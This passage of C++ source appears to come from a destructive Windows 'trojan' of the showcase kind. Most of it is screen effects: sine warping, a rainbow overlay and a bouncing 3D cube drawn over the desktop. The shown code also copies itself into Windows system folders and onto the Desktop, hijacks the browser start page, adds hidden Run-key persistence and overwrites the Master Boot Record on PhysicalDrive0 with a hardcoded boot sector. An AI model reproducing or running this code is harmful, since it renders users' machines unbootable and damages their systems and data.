			HBITMAP bmp = CreateDIBSection(screen, &bmpi, DIB_RGB_COLORS, (void**)&rgb, NULL, 0);
			HDC memDC = CreateCompatibleDC(screen);
			SelectObject(memDC, bmp);

			DWORD* base = NULL;
			HBITMAP basebmp = CreateDIBSection(screen, &bmpi, DIB_RGB_COLORS, (void**)&base, NULL, 0);
			HDC baseDC = CreateCompatibleDC(screen);
			SelectObject(baseDC, basebmp);

			DWORD* rb = NULL;
			HBITMAP rbmp = CreateDIBSection(screen, &bmpi, DIB_RGB_COLORS, (void**)&rb, NULL, 0);
			HDC rbDC = CreateCompatibleDC(screen);
			SelectObject(rbDC, rbmp);

			auto HSVtoDWORD = [&](float h)
				{
					float r, g, b;
					int i = (int)(h * 6.0f);
					float f = h * 6.0f - i;
					float p = 0.0f;
					float q = 1.0f - f;
					float t = f;

					switch (i % 6)
					{
					case 0: r = 1.0f; g = t;     b = p;     break;
					case 1: r = q;    g = 1.0f;  b = p;     break;
					case 2: r = p;    g = 1.0f;  b = t;     break;
					case 3: r = p;    g = q;     b = 1.0f;  break;
					case 4: r = t;    g = p;     b = 1.0f;  break;
					default: r = 1.0f; g = p;    b = q;     break;
					}

					BYTE R = (BYTE)(r * 255);
					BYTE G = (BYTE)(g * 255);
					BYTE B = (BYTE)(b * 255);
					return (DWORD)(B | (G << 8) | (R << 16));
				};

			int frame = 0;

			// New 3D gradient cube (replaces icon-cube)
			int w = sw;
			int h = sh;

			float ax = 0.0f, ay = 0.0f, az = 0.0f;
			float cx = (float)w / 2.0f;
			float cy = (float)h / 2.0f;
			float vx = 3.0f, vy = 2.0f;

			float cubeSize = 80.0f;
			float camDist = 600.0f;

			struct Vec3 { float x, y, z; };
			Vec3 baseVerts[8] =
			{
				{-1,-1,-1}, { 1,-1,-1}, { 1, 1,-1}, {-1, 1,-1},
				{-1,-1, 1}, { 1,-1, 1}, { 1, 1, 1}, {-1, 1, 1}
			};

			struct Face { int i0, i1, i2, i3; int r1, g1, b1, r2, g2, b2; };
			Face faces[6] =
			{
				{0,1,2,3, 255,0,0,   0,255,0},
				{4,5,6,7, 0,255,0,   255,0,0},
				{0,4,7,3, 255,0,0,   0,255,0},
				{1,5,6,2, 0,255,0,   255,0,0},
				{3,2,6,7, 255,0,0,   0,255,0},
				{0,1,5,4, 0,255,0,   255,0,0}
			};

			struct DrawFace { float depth; int idx; };

			while (1)
			{
				// Effect 1: sine BitBlt bands
				for (int ys = 0; ys < sh; ys++) {
					int dx = (int)(8.0 * sin(sinePhase));
					BitBlt(screen, dx, ys, sw, 1, screen, 0, ys, SRCCOPY);
					sinePhase += 0.04;
				}

				// Effect 2: HSV distort overlay
				StretchBlt(memDC, 0, 0, ws, hs, screen, 0, 0, sw, sh, SRCCOPY);

				for (int x = 0; x < ws; x++)
				{
					float hue = (float)x / ws;
					DWORD c = HSVtoDWORD(hue);
					for (int y = 0; y < hs; y++)
						base[y * ws + x] = c;
				}

				for (int x = 0; x < ws; x++)
				{
					float offset = sinf((x + frame * 4) * 0.02f) * 20.0f;
					for (int y = 0; y < hs; y++)
					{
						int yy = y + (int)offset;
						if (yy < 0) yy = 0;
						if (yy >= hs) yy = hs - 1;
						rb[y * ws + x] = base[yy * ws + x];
					}
				}

				BLENDFUNCTION bf;
				bf.BlendOp = AC_SRC_OVER;
				bf.BlendFlags = 0;
				bf.SourceConstantAlpha = 128;
				bf.AlphaFormat = 0;

				AlphaBlend(memDC, 0, 0, ws, hs, rbDC, 0, 0, ws, hs, bf);
				StretchBlt(screen, 0, 0, sw, sh, memDC, 0, 0, ws, hs, SRCCOPY);

				frame++;

				// New Effect 3: 3D gradient cube drawn over rainbow + sine
				{
					Vec3 v3d[8];
					POINT v2d[8];

					float sx = sinf(ax), cxr = cosf(ax);
					float sy = sinf(ay), cyr = cosf(ay);
					float sz = sinf(az), czr = cosf(az);

					for (int i = 0; i < 8; i++)
					{
						float x = baseVerts[i].x * cubeSize;
						float y = baseVerts[i].y * cubeSize;
						float z = baseVerts[i].z * cubeSize;

						float y1 = y * cxr - z * sx;
						float z1 = y * sx + z * cxr;
						y = y1; z = z1;

						float x2 = x * cyr + z * sy;
						float z2 = -x * sy + z * cyr;
						x = x2; z = z2;

						float x3 = x * czr - y * sz;
						float y3 = x * sz + y * czr;
						x = x3; y = y3;

						z += camDist;

						float invz = (z != 0.0f) ? (camDist / z) : 0.0f;
						float sx2 = x * invz + cx;
						float sy2 = y * invz + cy;

						v3d[i].x = x;
						v3d[i].y = y;
						v3d[i].z = z;
						v2d[i].x = (int)sx2;
						v2d[i].y = (int)sy2;
					}

					DrawFace order[6];
					for (int i = 0; i < 6; i++)
					{
						Face& f = faces[i];
						float zavg = (v3d[f.i0].z + v3d[f.i1].z + v3d[f.i2].z + v3d[f.i3].z) * 0.25f;
						order[i].depth = zavg;
						order[i].idx = i;
					}

					for (int a = 0; a < 6; a++)
						for (int b = a + 1; b < 6; b++)
							if (order[a].depth < order[b].depth)
							{
								DrawFace tmp = order[a];
								order[a] = order[b];
								order[b] = tmp;
							}

					for (int k = 0; k < 6; k++)
					{
						Face& f = faces[order[k].idx];

						TRIVERTEX tv[4];
						tv[0].x = v2d[f.i0].x; tv[0].y = v2d[f.i0].y;
						tv[1].x = v2d[f.i1].x; tv[1].y = v2d[f.i1].y;
						tv[2].x = v2d[f.i2].x; tv[2].y = v2d[f.i2].y;
						tv[3].x = v2d[f.i3].x; tv[3].y = v2d[f.i3].y;

						tv[0].Red = f.r1 << 8; tv[0].Green = f.g1 << 8; tv[0].Blue = f.b1 << 8; tv[0].Alpha = 0xFFFF;
						tv[1].Red = f.r2 << 8; tv[1].Green = f.g2 << 8; tv[1].Blue = f.b2 << 8; tv[1].Alpha = 0xFFFF;
						tv[2].Red = f.r1 << 8; tv[2].Green = f.g1 << 8; tv[2].Blue = f.b1 << 8; tv[2].Alpha = 0xFFFF;
						tv[3].Red = f.r2 << 8; tv[3].Green = f.g2 << 8; tv[3].Blue = f.b2 << 8; tv[3].Alpha = 0xFFFF;

						GRADIENT_TRIANGLE tri[2];
						tri[0].Vertex1 = 0; tri[0].Vertex2 = 1; tri[0].Vertex3 = 2;
						tri[1].Vertex1 = 0; tri[1].Vertex2 = 2; tri[1].Vertex3 = 3;

						GradientFill(screen, tv, 4, tri, 2, GRADIENT_FILL_TRIANGLE);
					}

					ax += 0.03f;
					ay += 0.025f;
					az += 0.035f;

					cx += vx;
					cy += vy;

					if (cx < 200.0f || cx > w - 200.0f) vx = -vx;
					if (cy < 200.0f || cy > h - 200.0f) vy = -vy;
				}

				Sleep(16);
			}

			// unreachable, but for completeness:
			DeleteObject(bmp);
			DeleteObject(basebmp);
			DeleteObject(rbmp);
			DeleteDC(memDC);
			DeleteDC(baseDC);
			DeleteDC(rbDC);
			ReleaseDC(NULL, screen);
			return 0;
		}

	DWORD WINAPI STARTMENU(LPVOID lpvd)
	{
			HWND taskbar = FindWindowA("Shell_TrayWnd", NULL);
			HWND startBtn = FindWindowExA(taskbar, NULL, "Button", NULL);

			if (!startBtn) return 0;

			bool flip = false;

			while (true) {
				SetWindowTextA(
					startBtn,
					flip ? "C://Windows/System/ENDFUCK.dll"
					: ("WS/XorDeath.exe"
						"something is wrong..."
						"terais feels my pain..."
						"WS/Dichdont.dll"
						"C://Windows/System/ENDFUCK.dll"
						"Windows Defender Firewall"
						"your end is near..."
						"you are dead..."
						"susususus")
				);
				flip = !flip;
				Sleep(100);
			}

			return 0;
		}
	
	




	//Create 512 random files on Desktop
	VOID SpamFiles(VOID)
	{
		for (int i = 0; i < 512; i++)
		{
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"Dustertium+.exe" + i);
		}
	}

	DWORD WINAPI Message(LPVOID lpvd)
	{
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);

		HDC dc = GetDC(NULL);
		HDC memDC = CreateCompatibleDC(dc);
		HBITMAP backBmp = CreateCompatibleBitmap(dc, w, h);
		SelectObject(memDC, backBmp);

		float ax = 0.0f, ay = 0.0f, az = 0.0f;
		float cx = (float)w / 2.0f;
		float cy = (float)h / 2.0f;
		float vx = 3.0f, vy = 2.0f;

		float cubeSize = 80.0f;   // ⭐ SMALL CUBE
		float camDist = 600.0f;

		struct Vec3 { float x, y, z; };
		Vec3 baseVerts[8] =
		{
			{-1,-1,-1}, { 1,-1,-1}, { 1, 1,-1}, {-1, 1,-1},
			{-1,-1, 1}, { 1,-1, 1}, { 1, 1, 1}, {-1, 1, 1}
		};

		struct Face { int i0, i1, i2, i3; int r1, g1, b1, r2, g2, b2; };
		Face faces[6] =
		{
			{0,1,2,3, 1,2,3,   0,255,0},
			{4,5,6,7, 4,5,6,   255,0,0},
			{0,4,7,3, 1,2,1,   0,255,0},
			{1,5,6,2, 6,7,0,   255,0,0},
			{3,2,6,7, 1,5,8,   0,255,0},
			{0,1,5,4, 8,2,9,   255,0,0}
		};

		struct DrawFace { float depth; int idx; };

		while (1)
		{
			// ⭐ No black background — draw over desktop
			BitBlt(memDC, 0, 0, w, h, dc, 0, 0, SRCCOPY);

			Vec3 v3d[8];
			POINT v2d[8];

			float sx = sinf(ax), cxr = cosf(ax);
			float sy = sinf(ay), cyr = cosf(ay);
			float sz = sinf(az), czr = cosf(az);

			for (int i = 0; i < 8; i++)
			{
				float x = baseVerts[i].x * cubeSize;
				float y = baseVerts[i].y * cubeSize;
				float z = baseVerts[i].z * cubeSize;

				float y1 = y * cxr - z * sx;
				float z1 = y * sx + z * cxr;
				y = y1; z = z1;

				float x2 = x * cyr + z * sy;
				float z2 = -x * sy + z * cyr;
				x = x2; z = z2;

				float x3 = x * czr - y * sz;
				float y3 = x * sz + y * czr;
				x = x3; y = y3;

				z += camDist;

				float invz = (z != 0.0f) ? (camDist / z) : 0.0f;
				float sx2 = x * invz + cx;
				float sy2 = y * invz + cy;

				v3d[i].x = x;
				v3d[i].y = y;
				v3d[i].z = z;
				v2d[i].x = (int)sx2;
				v2d[i].y = (int)sy2;
			}

			DrawFace order[6];
			for (int i = 0; i < 6; i++)
			{
				Face& f = faces[i];
				float zavg = (v3d[f.i0].z + v3d[f.i1].z + v3d[f.i2].z + v3d[f.i3].z) * 0.25f;
				order[i].depth = zavg;
				order[i].idx = i;
			}

			for (int a = 0; a < 6; a++)
				for (int b = a + 1; b < 6; b++)
					if (order[a].depth < order[b].depth)
					{
						DrawFace tmp = order[a];
						order[a] = order[b];
						order[b] = tmp;
					}

			for (int k = 0; k < 6; k++)
			{
				Face& f = faces[order[k].idx];

				TRIVERTEX tv[4];
				tv[0].x = v2d[f.i0].x; tv[0].y = v2d[f.i0].y;
				tv[1].x = v2d[f.i1].x; tv[1].y = v2d[f.i1].y;
				tv[2].x = v2d[f.i2].x; tv[2].y = v2d[f.i2].y;
				tv[3].x = v2d[f.i3].x; tv[3].y = v2d[f.i3].y;

				tv[0].Red = f.r1 << 8; tv[0].Green = f.g1 << 8; tv[0].Blue = f.b1 << 8; tv[0].Alpha = 0xFFFF;
				tv[1].Red = f.r2 << 8; tv[1].Green = f.g2 << 8; tv[1].Blue = f.b2 << 8; tv[1].Alpha = 0xFFFF;
				tv[2].Red = f.r1 << 8; tv[2].Green = f.g1 << 8; tv[2].Blue = f.b1 << 8; tv[2].Alpha = 0xFFFF;
				tv[3].Red = f.r2 << 8; tv[3].Green = f.g2 << 8; tv[3].Blue = f.b2 << 8; tv[3].Alpha = 0xFFFF;

				GRADIENT_TRIANGLE tri[2];
				tri[0].Vertex1 = 0; tri[0].Vertex2 = 1; tri[0].Vertex3 = 2;
				tri[1].Vertex1 = 0; tri[1].Vertex2 = 2; tri[1].Vertex3 = 3;

				GradientFill(memDC, tv, 4, tri, 2, GRADIENT_FILL_TRIANGLE);
			}

			BitBlt(dc, 0, 0, w, h, memDC, 0, 0, SRCCOPY);

			ax += 0.03f;
			ay += 0.025f;
			az += 0.035f;

			cx += vx;
			cy += vy;

			if (cx < 200.0f || cx > w - 200.0f) vx = -vx;
			if (cy < 200.0f || cy > h - 200.0f) vy = -vy;

			Sleep(10);
		}

		DeleteObject(backBmp);
		DeleteDC(memDC);
		ReleaseDC(NULL, dc);
		return 0;
	}

	VOID SpecialPayload(VOID)
	{
		//Change IE Start page
		System::SetRegValue(HKEY_CURRENT_USER, L"Software\\Microsoft\\Internet Explorer\\Main", L"Start Page", REG_SZ, (LPBYTE)L"https://www.youtube.com/@PankozaTestingTrojans", 96);
		System::SetRegValue(HKEY_CURRENT_USER, L"Software\\Microsoft\\Internet Explorer\\Main", L"Start Page", REG_SZ, (LPBYTE)L"https://www.youtube.com/watch?v=dQw4w9WgXcQ&list=RDdQw4w9WgXcQ&start_radio=1", 174);


		//Copy file to critical system's locals
		System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\System32\\Scanner.exe");
		System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\calc.exe");
		System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\bootstat.dat");

		//If is October 30:
		if (System::CheckDate(0) == 30 && System::CheckDate(1) == 9)
		{
			System::SetRegValue(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", L"WinNet", REG_SZ, (LPBYTE)L"C:\\Windows\\WinNet.exe", 16);
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\WinNet.exe");
			System::HideFile(L"C:\\Windows\\WinNet.exe");

			MessageBoxW(NULL, L"today is a freaking special day. im quitting of messages. but... Happy Halloween! so i will spare you. so, how about ill infect your system until your mbr dies?", L"FUCK???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????v????", MB_OK | MB_ICONINFORMATION);
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\who.smells.toe.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\who.smells.toes.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\who.smells.to.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\who.smells.t.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\who.smells..dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\who.smells.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\who.smell.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\who.smel.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\who.sme.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\who.sm.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\who.s.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\who..dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\who.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\wh.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\w.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\FUCK.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\TERAIS.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\itfeelspain...dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\illusionfuck.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\Trojan.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\PurgatoriumSimliar.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\who.smells.toes.exe");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\GOTMEFUCKEDUP.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\Dustertium.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\₨₣₵Q₣∄∊∌∐∑❈∅.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\₵Q₣∄∊∌∐∑≯≲ⅻↅ◀▲◢⧩⨞＄ПKrRp₨⅒⊉✱❈∅.exe");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\nevergonnagiveyouup.exe");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\nevergonnagiveyouup.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\bootstat.exe");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\DDT+.exe");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\bootstat.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\bootstat.dat");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\1_cactos.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\ChrisRM_380.dll");
			System::CopyMalwareFile(System::GetCurrentFileDir(), (WCHAR*)L"C:\\Windows\\N17Pro3426.dll");

			while (true)
			{
				Sleep(100000);
				MessageBoxA(NULL, "your end is near... teris feels my pain...", "T.E.R.A.I.S is near...", MB_OK | MB_ICONERROR);
			}
			exit(0);
		}
	}

	//The most efficient method of crashing system
	//Screw off NTAPI and TerminateProcess!
	// also forget this shit.
	VOID CrashLSASS(VOID)
	{
		System::RedrawScreen();
	}


	// Credits to: N17Pro3426 and trisodium for the mbr
	//Funfact: i made this mbr.
	VOID OverwriteMBR(VOID)
	{
		const unsigned char MBR[] =
		{
0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0xDB, 0xE3, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xBA, 0xC8, 0x03, 0x30,
0xC0, 0xEE, 0x42, 0xB9, 0x00, 0x01, 0x89, 0xCB, 0xF7, 0xDB, 0x83, 0xFB, 0x55, 0x7F, 0x0D, 0xB0,
0x00, 0xEE, 0x88, 0xD8, 0xD0, 0xE8, 0xEE, 0xB0, 0x00, 0xEE, 0xEB, 0x1D, 0x81, 0xFB, 0xAA, 0x00,
0x7F, 0x0B, 0xB0, 0x3F, 0xEE, 0xB0, 0x3F, 0xEE, 0xB0, 0x00, 0xEE, 0xEB, 0x0C, 0xB0, 0x3F, 0xEE,
0x88, 0xD8, 0xC0, 0xE8, 0x02, 0xEE, 0xB0, 0x00, 0xEE, 0xE2, 0xCB, 0x31, 0xFF, 0x31, 0xC0, 0x8E,
0xD8, 0xB4, 0x01, 0xCD, 0x16, 0x0F, 0x84, 0xF2, 0x00, 0xB4, 0x00, 0xCD, 0x16, 0x3C, 0x77, 0x74,
0x4B, 0x3C, 0x57, 0x74, 0x47, 0x3C, 0x73, 0x74, 0x58, 0x3C, 0x53, 0x74, 0x54, 0x3C, 0x61, 0x74,
0x64, 0x3C, 0x41, 0x74, 0x60, 0x3C, 0x64, 0x74, 0x70, 0x3C, 0x44, 0x74, 0x6C, 0x3C, 0x71, 0x74,
0x7C, 0x3C, 0x51, 0x74, 0x78, 0x3C, 0x65, 0x0F, 0x84, 0x8C, 0x00, 0x3C, 0x45, 0x0F, 0x84, 0x86,
0x00, 0x3C, 0x72, 0x0F, 0x84, 0x9A, 0x00, 0x3C, 0x52, 0x0F, 0x84, 0x94, 0x00, 0x3C, 0x74, 0x0F,
0x84, 0x9B, 0x00, 0x3C, 0x54, 0x0F, 0x84, 0x95, 0x00, 0xE9, 0x9F, 0x00, 0xD9, 0x06, 0xB4, 0x7D,
0xD9, 0x06, 0xBC, 0x7D, 0xD8, 0x0E, 0xC8, 0x7D, 0xDE, 0xE9, 0xD9, 0x1E, 0xB4, 0x7D, 0xE9, 0x8A,
0x00, 0xD9, 0x06, 0xB4, 0x7D, 0xD9, 0x06, 0xBC, 0x7D, 0xD8, 0x0E, 0xC8, 0x7D, 0xDE, 0xC1, 0xD9,
0x1E, 0xB4, 0x7D, 0xEB, 0x76, 0xD9, 0x06, 0xB0, 0x7D, 0xD9, 0x06, 0xB8, 0x7D, 0xD8, 0x0E, 0xC8,
0x7D, 0xDE, 0xE9, 0xD9, 0x1E, 0xB0, 0x7D, 0xEB, 0x62, 0xD9, 0x06, 0xB0, 0x7D, 0xD9, 0x06, 0xB8,
0x7D, 0xD8, 0x0E, 0xC8, 0x7D, 0xDE, 0xC1, 0xD9, 0x1E, 0xB0, 0x7D, 0xEB, 0x4E, 0xD9, 0x06, 0xB8,
0x7D, 0xD8, 0x0E, 0xC0, 0x7D, 0xD9, 0x1E, 0xB8, 0x7D, 0xD9, 0x06, 0xBC, 0x7D, 0xD8, 0x0E, 0xC0,
0x7D, 0xD9, 0x1E, 0xBC, 0x7D, 0xEB, 0x34, 0xD9, 0x06, 0xB8, 0x7D, 0xD8, 0x0E, 0xC4, 0x7D, 0xD9,
0x1E, 0xB8, 0x7D, 0xD9, 0x06, 0xBC, 0x7D, 0xD8, 0x0E, 0xC4, 0x7D, 0xD9, 0x1E, 0xBC, 0x7D, 0xEB,
0x1A, 0x80, 0x3E, 0xCC, 0x7D, 0xFF, 0x74, 0x13, 0xFE, 0x06, 0xCC, 0x7D, 0xEB, 0x0D, 0x80, 0x3E,
0xCC, 0x7D, 0x01, 0x76, 0x06, 0xFE, 0x0E, 0xCC, 0x7D, 0xEB, 0x00, 0xD9, 0x06, 0xB4, 0x7D, 0xBD,
0xC8, 0x00, 0xD9, 0x06, 0xB0, 0x7D, 0xBA, 0x40, 0x01, 0xD9, 0xEE, 0xD9, 0xEE, 0xA0, 0xCC, 0x7D,
0xD9, 0xC0, 0xDC, 0xC8, 0xD9, 0xC2, 0xDC, 0xC8, 0xDE, 0xE9, 0xD8, 0xC3, 0xD9, 0xC1, 0xD9, 0xC3,
0xDE, 0xC9, 0xDC, 0xC0, 0xD8, 0xC5, 0xDD, 0xDB, 0xDD, 0xD9, 0xD9, 0xC0, 0xDC, 0xC8, 0xD9, 0xC2,
0xDC, 0xC8, 0xDE, 0xC1, 0xDF, 0x1E, 0xCD, 0x7D, 0x83, 0x3E, 0xCD, 0x7D, 0x04, 0x7D, 0x04, 0xFE,
0xC8, 0x75, 0xCD, 0xDD, 0xD8, 0xDD, 0xD8, 0x01, 0xF0, 0xAA, 0xD8, 0x06, 0xB8, 0x7D, 0x4A, 0x75,
0xB8, 0xDD, 0xD8, 0xD8, 0x06, 0xBC, 0x7D, 0x4D, 0x75, 0xA8, 0x46, 0xDD, 0xD8, 0xE9, 0x9B, 0xFE,
0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0xC0, 0xBF, 0x0A, 0xD7, 0x23, 0x3C, 0x0A, 0xD7, 0x23, 0x3C,
0x66, 0x66, 0x66, 0x3F, 0xCD, 0xCC, 0x8C, 0x3F, 0x00, 0x00, 0xA0, 0x41, 0x40, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA

		};

		DWORD dwBytesWritten;

		HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

		WriteFile(hDrive, MBR, 512, &dwBytesWritten, NULL);
		CloseHandle(hDrive);
	}
}
	